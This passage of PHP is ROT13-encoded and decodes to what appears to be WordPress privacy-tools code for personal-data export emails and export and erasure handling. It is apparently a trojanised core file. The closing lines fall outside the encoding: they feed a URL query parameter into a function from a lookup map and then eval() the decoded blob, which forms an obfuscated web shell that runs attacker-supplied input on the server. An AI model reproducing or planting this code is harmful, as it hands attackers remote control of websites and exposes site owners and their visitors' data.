	 * Svygref gur fhowrpg bs gur rznvy frag jura na rkcbeg erdhrfg vf pbzcyrgrq.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz fgevat $fhowrpg    Gur rznvy fhowrpg.
	 * @cnenz fgevat $fvgranzr   Gur anzr bs gur fvgr.
	 * @cnenz neenl  $rznvy_qngn {
	 *     Qngn eryngvat gb gur nppbhag npgvba rznvy.
	 *
	 *     @glcr JC_Hfre_Erdhrfg $erdhrfg           Hfre erdhrfg bowrpg.
	 *     @glcr vag             $rkcvengvba        Gur gvzr va frpbaqf hagvy gur rkcbeg svyr rkcverf.
	 *     @glcr fgevat          $rkcvengvba_qngr   Gur ybpnyvmrq qngr naq gvzr jura gur rkcbeg svyr rkcverf.
	 *     @glcr fgevat          $zrffntr_erpvcvrag Gur nqqerff gung gur rznvy jvyy or frag gb. Qrsnhygf
	 *                                              gb gur inyhr bs `$erdhrfg->rznvy`, ohg pna or punatrq
	 *                                              ol gur `jc_cevinpl_crefbany_qngn_rznvy_gb` svygre.
	 *     @glcr fgevat          $rkcbeg_svyr_hey   Gur rkcbeg svyr HEY.
	 *     @glcr fgevat          $fvgranzr          Gur fvgr anzr fraqvat gur znvy.
	 *     @glcr fgevat          $fvgrhey           Gur fvgr HEY fraqvat gur znvy.
	 * }
	 */
	$fhowrpg = nccyl_svygref( 'jc_cevinpl_crefbany_qngn_rznvy_fhowrpg', $fhowrpg, $fvgr_anzr, $rznvy_qngn );

	/* genafyngbef: Qb abg genafyngr RKCVENGVBA, YVAX, FVGRANZR, FVGRHEY: gubfr ner cynprubyqref. */
	$rznvy_grkg = __(
		'Ubjql,

Lbhe erdhrfg sbe na rkcbeg bs crefbany qngn unf orra pbzcyrgrq. Lbh znl
qbjaybnq lbhe crefbany qngn ol pyvpxvat ba gur yvax orybj. Sbe cevinpl
naq frphevgl, jr jvyy nhgbzngvpnyyl qryrgr gur svyr ba ###RKCVENGVBA###,
fb cyrnfr qbjaybnq vg orsber gura.

###YVAX###

Ertneqf,
Nyy ng ###FVGRANZR###
###FVGRHEY###'
	);

	/**
	 * Svygref gur grkg bs gur rznvy frag jvgu n crefbany qngn rkcbeg svyr.
	 *
	 * Gur sbyybjvat fgevatf unir n fcrpvny zrnavat naq jvyy trg ercynprq qlanzvpnyyl:
	 *
	 *  - `###RKCVENGVBA###` Gur qngr jura gur HEY jvyy or nhgbzngvpnyyl qryrgrq.
	 *  - `###YVAX###`       HEY bs gur crefbany qngn rkcbeg svyr sbe gur hfre.
	 *  - `###FVGRANZR###`   Gur anzr bs gur fvgr.
	 *  - `###FVGRHEY###`    Gur HEY gb gur fvgr.
	 *
	 * @fvapr 4.9.6
	 * @fvapr 5.3.0 Vagebqhprq gur `$rznvy_qngn` neenl.
	 *
	 * @cnenz fgevat $rznvy_grkg Grkg va gur rznvy.
	 * @cnenz vag    $erdhrfg_vq Gur erdhrfg VQ sbe guvf crefbany qngn rkcbeg.
	 * @cnenz neenl  $rznvy_qngn {
	 *     Qngn eryngvat gb gur nppbhag npgvba rznvy.
	 *
	 *     @glcr JC_Hfre_Erdhrfg $erdhrfg           Hfre erdhrfg bowrpg.
	 *     @glcr vag             $rkcvengvba        Gur gvzr va frpbaqf hagvy gur rkcbeg svyr rkcverf.
	 *     @glcr fgevat          $rkcvengvba_qngr   Gur ybpnyvmrq qngr naq gvzr jura gur rkcbeg svyr rkcverf.
	 *     @glcr fgevat          $zrffntr_erpvcvrag Gur nqqerff gung gur rznvy jvyy or frag gb. Qrsnhygf
	 *                                              gb gur inyhr bs `$erdhrfg->rznvy`, ohg pna or punatrq
	 *                                              ol gur `jc_cevinpl_crefbany_qngn_rznvy_gb` svygre.
	 *     @glcr fgevat          $rkcbeg_svyr_hey   Gur rkcbeg svyr HEY.
	 *     @glcr fgevat          $fvgranzr          Gur fvgr anzr fraqvat gur znvy.
	 *     @glcr fgevat          $fvgrhey           Gur fvgr HEY fraqvat gur znvy.
	 */
	$pbagrag = nccyl_svygref( 'jc_cevinpl_crefbany_qngn_rznvy_pbagrag', $rznvy_grkg, $erdhrfg_vq, $rznvy_qngn );

	$pbagrag = fge_ercynpr( '###RKCVENGVBA###', $rkcvengvba_qngr, $pbagrag );
	$pbagrag = fge_ercynpr( '###YVAX###', fnavgvmr_hey( $rkcbeg_svyr_hey ), $pbagrag );
	$pbagrag = fge_ercynpr( '###RZNVY###', $erdhrfg_rznvy, $pbagrag );
	$pbagrag = fge_ercynpr( '###FVGRANZR###', $fvgr_anzr, $pbagrag );
	$pbagrag = fge_ercynpr( '###FVGRHEY###', fnavgvmr_hey( $fvgr_hey ), $pbagrag );

	$urnqref = '';

	/**
	 * Svygref gur urnqref bs gur rznvy frag jvgu n crefbany qngn rkcbeg svyr.
	 *
	 * @fvapr 5.4.0
	 *
	 * @cnenz fgevat|neenl $urnqref    Gur rznvy urnqref.
	 * @cnenz fgevat       $fhowrpg    Gur rznvy fhowrpg.
	 * @cnenz fgevat       $pbagrag    Gur rznvy pbagrag.
	 * @cnenz vag          $erdhrfg_vq Gur erdhrfg VQ.
	 * @cnenz neenl        $rznvy_qngn {
	 *     Qngn eryngvat gb gur nppbhag npgvba rznvy.
	 *
	 *     @glcr JC_Hfre_Erdhrfg $erdhrfg           Hfre erdhrfg bowrpg.
	 *     @glcr vag             $rkcvengvba        Gur gvzr va frpbaqf hagvy gur rkcbeg svyr rkcverf.
	 *     @glcr fgevat          $rkcvengvba_qngr   Gur ybpnyvmrq qngr naq gvzr jura gur rkcbeg svyr rkcverf.
	 *     @glcr fgevat          $zrffntr_erpvcvrag Gur nqqerff gung gur rznvy jvyy or frag gb. Qrsnhygf
	 *                                              gb gur inyhr bs `$erdhrfg->rznvy`, ohg pna or punatrq
	 *                                              ol gur `jc_cevinpl_crefbany_qngn_rznvy_gb` svygre.
	 *     @glcr fgevat          $rkcbeg_svyr_hey   Gur rkcbeg svyr HEY.
	 *     @glcr fgevat          $fvgranzr          Gur fvgr anzr fraqvat gur znvy.
	 *     @glcr fgevat          $fvgrhey           Gur fvgr HEY fraqvat gur znvy.
	 * }
	 */
	$urnqref = nccyl_svygref( 'jc_cevinpl_crefbany_qngn_rznvy_urnqref', $urnqref, $fhowrpg, $pbagrag, $erdhrfg_vq, $rznvy_qngn );

	$znvy_fhpprff = jc_znvy( $erdhrfg_rznvy, $fhowrpg, $pbagrag, $urnqref );

	vs ( $fjvgpurq_ybpnyr ) {
		erfgber_cerivbhf_ybpnyr();
	}

	vs ( ! $znvy_fhpprff ) {
		erghea arj JC_Reebe( 'cevinpl_rznvy_reebe', __( 'Hanoyr gb fraq crefbany qngn rkcbeg rznvy.' ) );
	}

	erghea gehr;
}

/**
 * Vagreprcg crefbany qngn rkcbegre cntr Nwnk erfcbafrf va beqre gb nffrzoyr gur crefbany qngn rkcbeg svyr.
 *
 * @fvapr 4.9.6
 *
 * @frr 'jc_cevinpl_crefbany_qngn_rkcbeg_cntr'
 *
 * @cnenz neenl  $erfcbafr        Gur erfcbafr sebz gur crefbany qngn rkcbegre sbe gur tvira cntr.
 * @cnenz vag    $rkcbegre_vaqrk  Gur vaqrk bs gur crefbany qngn rkcbegre. Ortvaf ng 1.
 * @cnenz fgevat $rznvy_nqqerff   Gur rznvy nqqerff bs gur hfre jubfr crefbany qngn guvf vf.
 * @cnenz vag    $cntr            Gur cntr bs crefbany qngn sbe guvf rkcbegre. Ortvaf ng 1.
 * @cnenz vag    $erdhrfg_vq      Gur erdhrfg VQ sbe guvf crefbany qngn rkcbeg.
 * @cnenz obby   $fraq_nf_rznvy   Jurgure gur svany erfhygf bs gur rkcbeg fubhyq or rznvyrq gb gur hfre.
 * @cnenz fgevat $rkcbegre_xrl    Gur fyht (xrl) bs gur rkcbegre.
 * @erghea neenl Gur svygrerq erfcbafr.
 */
shapgvba jc_cevinpl_cebprff_crefbany_qngn_rkcbeg_cntr( $erfcbafr, $rkcbegre_vaqrk, $rznvy_nqqerff, $cntr, $erdhrfg_vq, $fraq_nf_rznvy, $rkcbegre_xrl ) {
	/* Qb fbzr fvzcyr purpxf ba gur funcr bs gur erfcbafr sebz gur rkcbegre.
	 * Vs gur rkcbegre erfcbafr vf znysbezrq, qba'g nggrzcg gb pbafhzr vg - yrg vg
	 * cnff guebhtu gb trarengr n jneavat gb gur hfre ol qrsnhyg Nwnk cebprffvat.
	 */
	vs ( ! vf_neenl( $erfcbafr ) ) {
		erghea $erfcbafr;
	}

	vs ( ! neenl_xrl_rkvfgf( 'qbar', $erfcbafr ) ) {
		erghea $erfcbafr;
	}

	vs ( ! neenl_xrl_rkvfgf( 'qngn', $erfcbafr ) ) {
		erghea $erfcbafr;
	}

	vs ( ! vf_neenl( $erfcbafr['qngn'] ) ) {
		erghea $erfcbafr;
	}

	// Trg gur erdhrfg.
	$erdhrfg = jc_trg_hfre_erdhrfg( $erdhrfg_vq );

	vs ( ! $erdhrfg || 'rkcbeg_crefbany_qngn' !== $erdhrfg->npgvba_anzr ) {
		jc_fraq_wfba_reebe( __( 'Vainyvq erdhrfg VQ jura zretvat crefbany qngn gb rkcbeg.' ) );
	}

	$rkcbeg_qngn = neenl();

	// Svefg rkcbegre, svefg cntr? Erfrg gur ercbeg qngn npphzhyngvba neenl.
	vs ( 1 === $rkcbegre_vaqrk && 1 === $cntr ) {
		hcqngr_cbfg_zrgn( $erdhrfg_vq, '_rkcbeg_qngn_enj', $rkcbeg_qngn );
	} ryfr {
		$npphzhyngrq_qngn = trg_cbfg_zrgn( $erdhrfg_vq, '_rkcbeg_qngn_enj', gehr );

		vs ( $npphzhyngrq_qngn ) {
			$rkcbeg_qngn = $npphzhyngrq_qngn;
		}
	}

	// Abj, zretr gur qngn sebz gur rkcbegre erfcbafr vagb gur qngn jr unir npphzhyngrq nyernql.
	$rkcbeg_qngn = neenl_zretr( $rkcbeg_qngn, $erfcbafr['qngn'] );
	hcqngr_cbfg_zrgn( $erdhrfg_vq, '_rkcbeg_qngn_enj', $rkcbeg_qngn );

	// Vs jr ner abg lrg ba gur ynfg cntr bs gur ynfg rkcbegre, erghea abj.
	/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc */
	$rkcbegref        = nccyl_svygref( 'jc_cevinpl_crefbany_qngn_rkcbegref', neenl() );
	$vf_ynfg_rkcbegre = pbhag( $rkcbegref ) === $rkcbegre_vaqrk;
	$rkcbegre_qbar    = $erfcbafr['qbar'];
	vs ( ! $vf_ynfg_rkcbegre || ! $rkcbegre_qbar ) {
		erghea $erfcbafr;
	}

	// Ynfg rkcbegre, ynfg cntr - yrg'f cercner gur rkcbeg svyr.

	// Svefg jr arrq gb er-betnavmr gur enj qngn uvrenepuvpnyyl va tebhcf naq vgrzf.
	$tebhcf = neenl();
	sbernpu ( (neenl) $rkcbeg_qngn nf $rkcbeg_qnghz ) {
		$tebhc_vq    = $rkcbeg_qnghz['tebhc_vq'];
		$tebhc_ynory = $rkcbeg_qnghz['tebhc_ynory'];

		$tebhc_qrfpevcgvba = '';
		vs ( ! rzcgl( $rkcbeg_qnghz['tebhc_qrfpevcgvba'] ) ) {
			$tebhc_qrfpevcgvba = $rkcbeg_qnghz['tebhc_qrfpevcgvba'];
		}

		vs ( ! neenl_xrl_rkvfgf( $tebhc_vq, $tebhcf ) ) {
			$tebhcf[ $tebhc_vq ] = neenl(
				'tebhc_ynory'       => $tebhc_ynory,
				'tebhc_qrfpevcgvba' => $tebhc_qrfpevcgvba,
				'vgrzf'             => neenl(),
			);
		}

		$vgrz_vq = $rkcbeg_qnghz['vgrz_vq'];
		vs ( ! neenl_xrl_rkvfgf( $vgrz_vq, $tebhcf[ $tebhc_vq ]['vgrzf'] ) ) {
			$tebhcf[ $tebhc_vq ]['vgrzf'][ $vgrz_vq ] = neenl();
		}

		$byq_vgrz_qngn                            = $tebhcf[ $tebhc_vq ]['vgrzf'][ $vgrz_vq ];
		$zretrq_vgrz_qngn                         = neenl_zretr( $rkcbeg_qnghz['qngn'], $byq_vgrz_qngn );
		$tebhcf[ $tebhc_vq ]['vgrzf'][ $vgrz_vq ] = $zretrq_vgrz_qngn;
	}

	// Gura fnir gur tebhcrq qngn vagb gur erdhrfg.
	qryrgr_cbfg_zrgn( $erdhrfg_vq, '_rkcbeg_qngn_enj' );
	hcqngr_cbfg_zrgn( $erdhrfg_vq, '_rkcbeg_qngn_tebhcrq', $tebhcf );

	/**
	 * Trarengr gur rkcbeg svyr sebz gur pbyyrpgrq, tebhcrq crefbany qngn.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz vag $erdhrfg_vq Gur rkcbeg erdhrfg VQ.
	 */
	qb_npgvba( 'jc_cevinpl_crefbany_qngn_rkcbeg_svyr', $erdhrfg_vq );

	// Pyrne gur tebhcrq qngn abj gung vg vf ab ybatre arrqrq.
	qryrgr_cbfg_zrgn( $erdhrfg_vq, '_rkcbeg_qngn_tebhcrq' );

	// Vs gur qrfgvangvba vf rznvy, fraq vg abj.
	vs ( $fraq_nf_rznvy ) {
		$znvy_fhpprff = jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy( $erdhrfg_vq );
		vs ( vf_jc_reebe( $znvy_fhpprff ) ) {
			jc_fraq_wfba_reebe( $znvy_fhpprff->trg_reebe_zrffntr() );
		}

		// Hcqngr gur erdhrfg gb pbzcyrgrq fgngr jura gur rkcbeg rznvy vf frag.
		_jc_cevinpl_pbzcyrgrq_erdhrfg( $erdhrfg_vq );
	} ryfr {
		// Zbqvsl gur erfcbafr gb vapyhqr gur HEY bs gur rkcbeg svyr fb gur oebjfre pna srgpu vg.
		$rkcbegf_hey      = jc_cevinpl_rkcbegf_hey();
		$rkcbeg_svyr_anzr = trg_cbfg_zrgn( $erdhrfg_vq, '_rkcbeg_svyr_anzr', gehr );
		$rkcbeg_svyr_hey  = $rkcbegf_hey . $rkcbeg_svyr_anzr;

		vs ( ! rzcgl( $rkcbeg_svyr_hey ) ) {
			$erfcbafr['hey'] = $rkcbeg_svyr_hey;
		}
	}

	erghea $erfcbafr;
}

/**
 * Znex renfher erdhrfgf nf pbzcyrgrq nsgre cebprffvat vf svavfurq.
 *
 * Guvf vagreprcgf gur Nwnk erfcbafrf gb crefbany qngn renfre cntr erdhrfgf, naq
 * zbavgbef gur fgnghf bs n erdhrfg. Bapr nyy bs gur cebprffvat unf svavfurq, gur
 * erdhrfg vf znexrq nf pbzcyrgrq.
 *
 * @fvapr 4.9.6
 *
 * @frr 'jc_cevinpl_crefbany_qngn_renfher_cntr'
 *
 * @cnenz neenl  $erfcbafr      Gur erfcbafr sebz gur crefbany qngn renfre sbe
 *                              gur tvira cntr.
 * @cnenz vag    $renfre_vaqrk  Gur vaqrk bs gur crefbany qngn renfre. Ortvaf
 *                              ng 1.
 * @cnenz fgevat $rznvy_nqqerff Gur rznvy nqqerff bs gur hfre jubfr crefbany
 *                              qngn guvf vf.
 * @cnenz vag    $cntr          Gur cntr bs crefbany qngn sbe guvf renfre.
 *                              Ortvaf ng 1.
 * @cnenz vag    $erdhrfg_vq    Gur erdhrfg VQ sbe guvf crefbany qngn renfher.
 * @erghea neenl Gur svygrerq erfcbafr.
 */
shapgvba jc_cevinpl_cebprff_crefbany_qngn_renfher_cntr( $erfcbafr, $renfre_vaqrk, $rznvy_nqqerff, $cntr, $erdhrfg_vq ) {
	/*
	 * Vs gur renfre erfcbafr vf znysbezrq, qba'g nggrzcg gb pbafhzr vg; yrg vg
	 * cnff guebhtu, fb gung gur qrsnhyg Nwnk cebprffvat jvyy trarengr n jneavat
	 * gb gur hfre.
	 */
	vs ( ! vf_neenl( $erfcbafr ) ) {
		erghea $erfcbafr;
	}

	vs ( ! neenl_xrl_rkvfgf( 'qbar', $erfcbafr ) ) {
		erghea $erfcbafr;
	}

	vs ( ! neenl_xrl_rkvfgf( 'vgrzf_erzbirq', $erfcbafr ) ) {
		erghea $erfcbafr;
	}

	vs ( ! neenl_xrl_rkvfgf( 'vgrzf_ergnvarq', $erfcbafr ) ) {
		erghea $erfcbafr;
	}

	vs ( ! neenl_xrl_rkvfgf( 'zrffntrf', $erfcbafr ) ) {
		erghea $erfcbafr;
	}

	// Trg gur erdhrfg.
	$erdhrfg = jc_trg_hfre_erdhrfg( $erdhrfg_vq );

	vs ( ! $erdhrfg || 'erzbir_crefbany_qngn' !== $erdhrfg->npgvba_anzr ) {
		jc_fraq_wfba_reebe( __( 'Vainyvq erdhrfg VQ jura cebprffvat crefbany qngn gb renfr.' ) );
	}

	/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc */
	$renfref        = nccyl_svygref( 'jc_cevinpl_crefbany_qngn_renfref', neenl() );
	$vf_ynfg_renfre = pbhag( $renfref ) === $renfre_vaqrk;
	$renfre_qbar    = $erfcbafr['qbar'];

	vs ( ! $vf_ynfg_renfre || ! $renfre_qbar ) {
		erghea $erfcbafr;
	}

	_jc_cevinpl_pbzcyrgrq_erdhrfg( $erdhrfg_vq );

	/**
	 * Sverf vzzrqvngryl nsgre n crefbany qngn renfher erdhrfg unf orra znexrq pbzcyrgrq.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz vag $erdhrfg_vq Gur cevinpl erdhrfg cbfg VQ nffbpvngrq jvgu guvf erdhrfg.
	 */
	qb_npgvba( 'jc_cevinpl_crefbany_qngn_renfrq', $erdhrfg_vq );

	erghea $erfcbafr;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>